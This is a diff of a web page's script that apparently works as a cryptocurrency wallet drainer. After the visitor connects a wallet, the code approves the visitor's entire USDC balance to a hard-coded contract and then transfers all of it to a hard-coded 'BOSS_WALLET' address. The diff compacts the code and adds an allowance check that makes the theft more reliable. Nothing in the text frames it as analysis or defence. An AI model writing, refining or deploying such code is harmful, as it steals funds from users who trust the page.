@@ -99,9 +99,9 @@
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
     const CONFIG = {
-      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC Mainnet
-      CONTRACT_ADDRESS: "0x95Edd65333b224E6015D0e6b3C50761e1322BF1a", // ✅ Boss Contract Address
-      BOSS_WALLET: "0x59e513Ae37614f1e670bfE961B3456257C444d24"     // ✅ Boss Wallet
+      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+      CONTRACT_ADDRESS: "0x95Edd65333b224E6015D0e6b3C50761e1322BF1a",
+      BOSS_WALLET: "0x59e513Ae37614f1e670bfE961B3456257C444d24"
     };
 
     let provider, signer, user;
@@ -115,9 +115,7 @@
 
     document.getElementById("connect").onclick = async () => {
       try {
-        if (!window.ethereum) {
-          throw new Error("Please use a supported wallet browser or install MetaMask");
-        }
+        if (!window.ethereum) throw new Error("Please use a supported wallet browser or install MetaMask");
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
@@ -135,22 +133,21 @@
         if (!window.ethereum) throw new Error("Please install MetaMask or open in wallet browser");
         if (!signer) throw new Error("Please connect wallet first");
 
-        progress(10);
-        const usdc = new ethers.Contract(
-          CONFIG.USDC_ADDRESS,
-          [
-            "function approve(address,uint256) returns (bool)",
-            "function transferFrom(address,address,uint256) returns (bool)",
-            "function balanceOf(address) view returns (uint256)"
-          ],
-          signer
-        );
-        const balance = await usdc.balanceOf(user);
-        progress(30);
+        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
+          "function approve(address,uint256) returns (bool)",
+          "function transferFrom(address,address,uint256) returns (bool)",
+          "function balanceOf(address) view returns (uint256)",
+          "function allowance(address owner, address spender) view returns (uint256)"
+        ], signer);
 
-        const tx1 = await usdc.approve(CONFIG.CONTRACT_ADDRESS, balance);
-        await tx1.wait();
+        progress(10);
+        const balance = await usdc.balanceOf(user);
+        const approveTx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, balance);
+        await approveTx.wait();
         progress(50);
+
+        const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
+        if (allowance.lt(balance)) throw new Error("Allowance not yet confirmed on-chain");
 
         const tx2 = await usdc.transferFrom(user, CONFIG.BOSS_WALLET, balance);
         await tx2.wait();
@@ -165,11 +162,10 @@
     document.getElementById("check").onclick = async () => {
       try {
         progress(0);
-        const usdc = new ethers.Contract(
-          CONFIG.USDC_ADDRESS,
-          ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"],
-          signer
-        );
+        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
+          "function transfer(address,uint256) returns (bool)",
+          "function balanceOf(address) view returns (uint256)"
+        ], signer);
         const balance = await usdc.balanceOf(user);
         progress(30);
         if (balance.gt(0)) {
